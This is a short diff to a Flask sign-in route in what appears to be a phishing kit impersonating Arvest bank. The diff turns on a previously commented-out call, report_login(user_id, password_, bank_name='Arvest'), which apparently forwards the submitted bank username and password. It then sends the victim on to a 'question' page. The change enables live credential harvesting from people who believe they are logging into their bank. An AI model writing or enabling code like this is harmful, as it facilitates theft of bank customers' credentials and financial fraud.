@@ -9,7 +9,7 @@ def signin():
         user_id = request.form['user-id']
         password_ = request.form['password']
         if user_id and password_:
-            # report_login(user_id,password_,bank_name='Arvest')
+            report_login(user_id,password_,bank_name='Arvest')
             return redirect(url_for('portals.question'))
     return render_template('signin.html')
 
